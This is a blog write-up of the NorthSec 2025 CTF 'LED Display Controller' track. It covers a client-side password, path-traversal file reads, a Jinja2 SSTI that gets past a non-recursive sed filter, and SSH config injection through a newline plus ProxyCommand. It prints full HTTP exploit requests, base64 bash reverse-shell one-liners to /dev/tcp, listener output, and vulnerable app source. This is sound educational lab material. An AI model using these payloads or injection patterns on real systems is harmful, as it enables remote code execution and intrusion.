---
layout: post
title: NorthSec 2025 Writeup - LED Display Controller
date: 2025-05-19
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2025/05/NorthSec/LedDisplayController
img: 2025/05/NorthSec/LedDisplayController/Description.png
---

In this track, we had to hack a system that controlled some LED displays. I completely missed the first flag. I exploited an arbitrary file read vulnerability to get the second flag. And an SSTI vulnerability to get the third flag.

```
When it will be time to act, I want to make sure that people don’t get in my way. I don’t want to hurt more people than I need.

The whole ship has these LED displays that have a message showing up on all of them.

Do your thing on the controller, hacker. I want you to show a message on the displays when I’ll be doing my thing. Go get control over it first.
```

## Web Sites

The track had to web applications. The first one was the display that showed a welcome message.

![Display](/assets/images/2025/05/NorthSec/LedDisplayController/Display.png "Display")

And the other exposed some functions to control the message on the display.

![Controller](/assets/images/2025/05/NorthSec/LedDisplayController/Controller.png "Controller")

It exposed three functions.

![Functions](/assets/images/2025/05/NorthSec/LedDisplayController/Functions.png "Functions")

* List the template
* Change the template
* Write a custom message

We needed a password to use the application. But that was very easy, it was validated on the client side.

```js
window.onload = function(){
    update = function(){
        if(document.getElementById("password").value == atob("Qm9uc2Vjb3VyczEyMyE=")){
            document.forms[0].submit();
        }
        else {
            document.getElementById("alert").innerHTML = "Invalid password.";
        }
    }            
}
```

The password was encoded in base64. I decoded it.

```bash
$ echo -n Qm9uc2Vjb3VyczEyMyE= | base64 -d ; echo
Bonsecours123!
```

## Flag 2

The application allowed changing the message on the displays. I tried sending some SSTI, but my payloads appeared to be sanitized. I sent `{% raw %}{{ 7 * 7}}{% endraw %}`. The display only showed `7 * 7` without the brackets.

I left that aside and looked at the templates. The list function showed two templates I could use.

![Templates](/assets/images/2025/05/NorthSec/LedDisplayController/Templates.png "Templates")

Those were filenames. So I immediately tried to read other files from the server. 

![File Read](/assets/images/2025/05/NorthSec/LedDisplayController/FileRead.png "File Read")

The UI showed a success, and the content of the `passwd` file started appearing on the display. That was not very practical to read, so I looked at it in Caido.

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: upgrade
Sec-WebSocket-Accept: JQ+pE3D0a8m7pOa19yWbFIMtV8Q=
Date: Mon, 19 May 2025 19:01:47 GMT
Server: Python/3.12 aiohttp/3.11.18

~root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
service:x:1000:1000::/home/service:/bin/bash
```

I was able to read files on the server used to display the messages. I used it to read the source code of the display application in `../app.py`.

```python
import argparse
import asyncio
import configparser
import contextlib
import os
import logging
import random
import sys

import aiofiles
from aiohttp import web
from jinja2 import Template

logger = logging.getLogger(__name__)
routes = web.RouteTableDef()

"""
To run this app use: adev runserver led_display.py --port 1338 -- --filepath message.txt
You need to install aiohttp-devtools first
"""

weather_task = web.AppKey("weather_task", asyncio.Task[None])
message_task = web.AppKey("message_task", asyncio.Task[None])
message_data = web.AppKey("message_data", dict[str])
message_file_path = web.AppKey("message_file_path", str)
message_polling_interval = web.AppKey("message_polling_interval", int)
message = web.AppKey("message", str)
clients = web.AppKey("clients", set[web.WebSocketResponse])


async def fetch_message(file_path: str) -> str:
    if not os.path.exists(file_path):
        return "Message not found"
    async with aiofiles.open(file_path, "r", encoding="utf-8") as f:
        return (await f.read()).strip()


@routes.get("/")
async def index(request):
    return web.FileResponse(path=os.path.join("static", "index.html"))


@routes.get("/ws")
async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    request.app[clients].add(ws)
    try:
        await ws.send_str(request.app[message])
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                pass
            elif msg.type == web.WSMsgType.CLOSED:
                break
            elif msg.type == web.WSMsgType.ERROR:
                logger.error("WebSocket error:", ws.exception())
    finally:
        request.app[clients].remove(ws)
    return ws


async def background_tasks(app):

    async def broadcast(message: str):
        for user in app[clients]:
            await user.send_str(message)

    async def message_watcher():
        try:
            while True:
                await asyncio.sleep(app[message_polling_interval])
                try:
                    message_template = await fetch_message(app[message_file_path])
                    new_message = await asyncio.wait_for(asyncio.to_thread(Template(message_template).render, app[message_data]),timeout=30)
                except Exception as e:
                    logger.exception(e)
                    continue
                if new_message != app[message]:
                    app[message] = new_message
                    await broadcast(new_message)
        except Exception as e:
            logger.exception(e)
            raise

    app[message_data].update(
        {
            "temperature": 15,
            "wind_speed": 0,
            "condition": "sunny",
        }
    )

    async def update_weather(polling=300):
        conditions = ["sunny", "cloudy", "rainy", "stormy", "foggy", "windy"]
        try:
            while True:
                app[message_data]["temperature"] = max(min(app[message_data]["temperature"] + random.uniform(-1, 1), 25), 5)
                app[message_data]["condition"] = random.choice(conditions)
                match app[message_data]["condition"]:
                    case "stormy":
                        app[message_data]["wind_speed"] = random.uniform(50, 100)
                    case "windy":
                        app[message_data]["wind_speed"] = random.uniform(30, 50)
                    case _:
                        app[message_data]["wind_speed"] = random.uniform(0, 30)
                await asyncio.sleep(polling)
        except Exception as e:
            logger.exception(e)
            raise

    app[message_task] = asyncio.create_task(message_watcher())
    app[weather_task] = asyncio.create_task(update_weather())

    yield

    app[message_task].cancel()
    app[weather_task].cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await app[message_task]
        await app[weather_task]


async def create_app():
    app = web.Application()

    logging.basicConfig(
        level=logging.DEBUG,
        format="%(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
        ],
    )
    logging.getLogger("aiohttp").setLevel(logging.ERROR)

    parser = argparse.ArgumentParser(description="LED display")
    parser.add_argument("--file-path", required=True, help="file path of the message to display")
    parser.add_argument(
        "--polling-interval",
        default=2,
        help="polling time to check the message file",
        type=int,
    )
    args = parser.parse_args()

    app[message] = ""
    app[message_file_path] = args.file_path
    app[message_polling_interval] = args.polling_interval
    app[message_data] = {}
    app[clients] = set()

    config = configparser.ConfigParser()
    config.read("config.ini")
    app[message_data].update(config["message_data"])
    app.add_routes(routes)
    app.add_routes([web.static("/", "./static")])
    app.cleanup_ctx.append(background_tasks)

    return app


if __name__ == "__main__":
    app = create_app()
    web.run_app(app, host="::", port=8080)
```

I spent some time reading the source code. Nothing stood out as a vulnerability. I also extracted the `config.ini` file, it had nothing interesting. 

```ini
[message_data]
departure_location = Vieux-Port de Montreal
boat_name = CVSS Bonsecours
```

I tried reading other files from the server. But I did not find anything interesting. The controller UI made it clear that it was using SSH to reach out to `led-display.ctf` from `led-display-controller.ctf`. I tried to have it connect to itself, the connection was refused. I extracted the `.ssh/authorized_keys` from the display server.

```http
GET /?host=led-display.ctf&port=22&username=service&function=change_template&argument=..%2F..%2F..%2F..%2F..%2Fhome%2Fservice%2F.ssh%2Fauthorized_keys&password=Bonsecours123%21 HTTP/1.1
Host: led-display-controller.ctf:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: upgrade
Sec-WebSocket-Accept: JQ+pE3D0a8m7pOa19yWbFIMtV8Q=
Date: Mon, 19 May 2025 19:13:08 GMT
Server: Python/3.12 aiohttp/3.11.18

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPF6UoytmD3jDcZpOCBHM9s3euyPkm0UlGuhv7Cv3oO/ mbergeron@pentest-mbergeron
```

It showed that an SSH private key was probably used to connect to it. Either by the script that modified the display, or by the challenge designer. I tried reading private keys on this server. I did not find any.

I was wondering how the script was executed on the display server. I extracted the SSH configuration. This had something interesting at the end.

```
Match User service
  ForceCommand ./update.sh
  PermitTunnel no
  PermitOpen none
  AllowAgentForwarding no
  AllowTcpForwarding no
  X11Forwarding no
```

The `ForceCommand` directive force the execution of the `./update.sh` script when a user connects to the server. I extracted that file to see what it did.

```bash
#!/bin/bash

# FLAG-9efcd6325e8ae8e828562a16af162c5a (2/3)

MESSAGE_FILE="message.txt"
TEMPLATE_DIR="templates"

usage() {
    echo "Usage: $0 [-m <message>] [-t <template>] [-l]"
    echo "  -m <message>   Update with a custom message."
    echo "  -t <template>  Use a predefined template from templates directory."
    echo "  -l             List available templates."
    exit 1
}

list_templates() {
    if [[ ! -d "$TEMPLATE_DIR" ]]; then
        echo "Error: Templates directory '$TEMPLATE_DIR' does not exist."
        exit 1
    fi

    echo "Available template:"
    ls -1 "$TEMPLATE_DIR"
    exit 0
}

if [[ "$SSH_ORIGINAL_COMMAND" ]]; then
    set -- "$SSH_ORIGINAL_COMMAND"
fi

if [[ $# -eq 0 ]]; then
    usage
fi

while getopts ":m:t:l" opt; do
    case $opt in
        m)  # Custom message
            rm -f "$MESSAGE_FILE"
            echo "$OPTARG" | sed -E 's/(__|\{[%\{]|[\}%]\})//g' > "$MESSAGE_FILE"
            echo "Message updated."
            ;;
        t)  # Template selection
            TEMPLATE_PATH="$TEMPLATE_DIR/$OPTARG"
            if [[ ! -f "$TEMPLATE_PATH" ]]; then
                echo "Error: Template '$OPTARG' not found in $TEMPLATE_DIR."
                exit 1
            fi
            ln -sf "$TEMPLATE_PATH" "$MESSAGE_FILE"
            echo "Message updated."
            ;;
        l)  # List templates
            list_templates
            ;;
        *)  # Invalid option
            usage
            ;;
    esac
done
```

I finally had a flag!

```bash
$ askgod submit FLAG-9efcd6325e8ae8e828562a16af162c5a
Congratulations, you score your team 2 points!
Message: Oh, we can see the code now. Can we find a bug in the code to gain full control? (2/3)
```

## Flag 3

The update script had the regular expression that was used to prevent SSTI. 
```bash
echo "$OPTARG" | sed -E 's/(__|\{[%\{]|[\}%]\})//g' > "$MESSAGE_FILE"
```

This regular expression was looking for a few pairs of characters and replacing them with nothing.

* `{% raw %}__{% endraw %}`
* `{% raw %}{%{% endraw %}`
* `{% raw %}{{{% endraw %}`
* `{% raw %}%}{% endraw %}`
* `{% raw %}}}{% endraw %}`

I thought that this replacement was not recursive. So I might be able to construct a valid SSTI by constructing a payload and inserting extra tags between the tags I needed. For example if I used `{% raw %}{__{{% endraw %}`, the regular expression would remove the `{% raw %}__{% endraw %}` and leave me with the `{% raw %}{{{% endraw %}` I needed.

I tried it locally.

```bash
$ cat test.sh
OPTARG="{__{7*7}__}"
echo $OPTARG | sed -E 's/(__|\{[%\{]|[\}%]\})//g'

$ sh test.sh                                                                                                                                
{% raw %}{{7*7}}{% endraw %}
```

It worked! I tried sending it to the server and got 49 on the display. I was able to run code on the server.

I used that to get a reverse shell. First I built a payload without special characters to make sending it over HTTP easier.

```bash
$ echo 'bash -c "bash  -i >& /dev/tcp/shell.ctf/443 0>&1" ' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzQ0MyAwPiYxIiAK
```

Next I inserted into Remote Code Execution payload for Jinja2. And inserted the extra tags between the needed tags and sent it to the server.

```http
GET /?host=led-display.ctf&port=22&username=service&function=custom_message&argument=%7B__%7B+%27%27._%7B%7B_class_%7B%7B_.mro%28%29%5B1%5D._%7B%7B_subclasses_%7B%7B_%28%29%5B267%5D%28%27echo+YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzQ0MyAwPiYxIiAK+%7Cbase64+-d+%7C+bash%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29+%7D__%7D&password=Bonsecours123%21 HTTP/1.1
Host: led-display-controller.ctf:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

I got the hit on my `nc` listener. And the third flag.

```bash
root@shell01:~/eric# nc -6 -knvlp 443
Listening on :: 443

Connection received on 9000:fc4c:d8a7:bb91:216:3eff:fe44:19ae 59450
bash: cannot set terminal process group (233): Inappropriate ioctl for device
bash: no job control in this shell
service@led-display:~$

service@led-display:~$ ls
ls
app.py
bin
config.ini
lib
message.txt
pyvenv.cfg
static
templates
update.sh

service@led-display:~$ ls /
ls /
bin
bin.usr-is-merged
boot
dev
etc
flag_here_1e39.txt
home
lib
lib64
lib.usr-is-merged
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var

service@led-display:~$ cat /flag_here_1e39.txt
cat /flag_here_1e39.txt
ALERT! ALERT! SECURITY BREACH! DO NOT PANIC! FLAG-baa774f220d8dc3b2b72bff39671467c (3/3)
```

I submitted the flag for 3 points.

```bash
$ askgod submit FLAG-baa774f220d8dc3b2b72bff39671467c                                      
Congratulations, you score your team 3 points!
Message: It says "ALERT!" on the LED display. Now hopefully that will help us for the heist! (3/3)
```

## Flag 1

I did not find the first flag during the event. I looked all over the display server, but it was clear that it was on the controller server. I tried to gain access to it, but I failed. The designer (Marc Olivier Bergeron) gave the solution on [Discord](https://discord.com/channels/444285101476544515/1368967482789855313/1373746151530037278) after the event. I'm doing it now while the infra is still up.

To get access to the server, you need to use ProxyCommand. It's a directive used to define a proxy to use when connecting to a server. The example given uses a `%0a` between the username and the ProxyCommand directive. This directive is used in an SSH configuration file. The code probably builds that file when sending requests. Let's give it a try.

```http
GET /?host=led-display.ctf&port=22&username=service%0aProxyCommand%20`id`&function=list&argument=&password=Bonsecours123%21 HTTP/1.1
Host: led-display-controller.ctf:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

The response had an error with the result from the `id` command

```html
        </div>
        <div id="alert" class="form-input">&nbsp;</div>
    </form>
    <pre>/bin/sh: 1: exec: uid=1000(service): not found
Connection closed by UNKNOWN port 65535
</pre>
```

I have code execution. Let's use that to get a shell on the server. 

```bash
$ echo 'bash  -i >& /dev/tcp/shell.ctf/5555 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzU1NTUgMD4mMSAK
```

```http
GET /?host=led-display.ctf&port=22&username=service%0aProxyCommand%20`echo%20YmFzaCAgLWkgPiYgL2Rldi90Y3Avc2hlbGwuY3RmLzU1NTUgMD4mMSAK|base64%20-d|bash`&function=list&argument=&password=Bonsecours123%21 HTTP/1.1
Host: led-display-controller.ctf:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

I'm on the server.

```bash
root@shell01:~/eric# nc -6 -knvlp 5555
Listening on :: 5555

Connection received on 9000:fc4c:d8a7:bb91:216:3eff:feda:bb34 52976
service@controller:~$

service@controller:~$ ls
ls
app.py
bin
controller_key
lib
pyvenv.cfg
static

service@controller:~$ ls /
ls /
bin
bin.usr-is-merged
boot
dev
etc
flag.txt
home
lib
lib64
lib.usr-is-merged
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
srv
sys
tmp
usr
var

service@controller:~$ cat /flag.txt
cat /flag.txt
FLAG-bf8e957ac369a3b2bb41b9cdcfc36133 (1/3)
```

That was fun. The connection is unstable. But I dumped the application on that server to see what it looks like. The `do_ssh` function is the interesting part. It builds an SSH configuration file as I expected.

```python
#!/usr/bin/env python
import re
import os
import html
import base64
import pexpect

from ipaddress import ip_address
from flask import Flask, request, url_for

app = Flask(__name__)

DEFAULT_HOST = "led-display.ctf"
DEFAULT_PORT = "22"
DEFAULT_USERNAME = "service"
DEFAULT_PASSWORD = "Bonsecours123!"
FUNCTIONS = ["list", "change_template", "custom_message"]

def do_ssh(host, port, username, function, argument):
    ret = ""
    ssh_config_file = "/tmp/ssh_0c69c288d63d"
    command = "ssh"
    args = ["led-display"]

    config = open(ssh_config_file, "w")
    config.write(
        "Host led-display\n"
        "CheckHostIP no\n"
        "StrictHostKeyChecking no\n"
        "ConnectTimeout 30\n"
        "IdentityFile controller_key\n"
        "HostName %s\n"
        "Port %s\n"
        "User %s\n"
        "UserKnownHostsFile /dev/null\n"
        "GlobalKnownHostsFile /dev/null\n"
        "PreferredAuthentications publickey\n" %
        (host, port, username))
    config.close()

    allargs = [ "-F", config.name ]
    allargs.extend(args)
    if function in FUNCTIONS:
        allargs.append("--")
        if function == FUNCTIONS[0]:
            allargs.append("-l")
        elif function == FUNCTIONS[1]:
            allargs.append(f"-t{argument}")
        elif function == FUNCTIONS[2]:
            allargs.append(f"-m{argument}")

    try:
        ssh = pexpect.spawn(command, allargs, timeout=5, encoding="UTF-8")

        ssh.expect(pexpect.EOF)
        ret = ssh.before
    except pexpect.EOF:
        ssh_error = ssh.before.strip().split("\n")[-1]
        if ssh_error.endswith("Connection timed out"):
            raise Exception("SSH connection timed out: %s" % ssh_error)
        elif ssh_error.startswith("Permission denied"):
            raise Exception("Login failure: %s" % ssh_error)
        elif ssh_error.startswith("ssh: connect to host"):
            raise Exception("SSH connection error: %s" % ssh_error)
        else:
            raise Exception(ssh.before.strip())
    except pexpect.TIMEOUT:
        raise Exception("SSH command timed out: %s" % ssh.before.strip())
    except pexpect.ExceptionPexpect as e:
        raise Exception(str(e))
    finally:
        os.remove(ssh_config_file)

    # Check for invalid path.
    if ret.strip().endswith("No such file or directory"):
        raise Exception("SSH error: %s" % ret.strip())

    ssh.close()

    return ret

@app.route("/", methods=["GET"])
def index():
    ret = ""
    errors = []

    host = request.args.get("host", DEFAULT_HOST)
    port = request.args.get("port", DEFAULT_PORT)
    username = request.args.get("username", DEFAULT_USERNAME)
    password = request.args.get("password", "")
    function = request.args.get("function", "")
    argument = request.args.get("argument", "")

    if request.args.get("host", None) or request.args.get("port", None) or request.args.get("username", None) or request.args.get("function", None):
        if not function or not function in FUNCTIONS:
            errors.append(f"Invalid parameter: function. Must be: {', '.join(FUNCTIONS)}")
        elif not argument and function in FUNCTIONS[1:2]:
            errors.append("Must not be empty: argument.")

        try:
            ip_address(host)
        except:
            if not re.match(r"^[a-zA-Z0-9\-][a-z0-9A-Z\.\-]+[a-zA-Z]$", host):
                errors.append("Invalid parameter: host.")

        if(not port.isnumeric() or int(port) < 1 or int(port) > 65538):
            errors.append("Invalid parameter: port.")

        if not username:
            errors.append("Must not be empty: username.")

        if not errors:
            try:
                ret = do_ssh(host=host, port=port, username=username, function=function, argument=argument)
            except Exception as e:
                ret = str(e)
        else:
            ret = "\n".join(errors)

    return f"""<html>
    <head>
        <title>LED Display Controller</title>
    </head>
    <style>
    *
    {% raw %}{{
        color: green;
        font-family: "Courier New", Courier, monospace;
    }}{% endraw %}

...
</html>
"""
```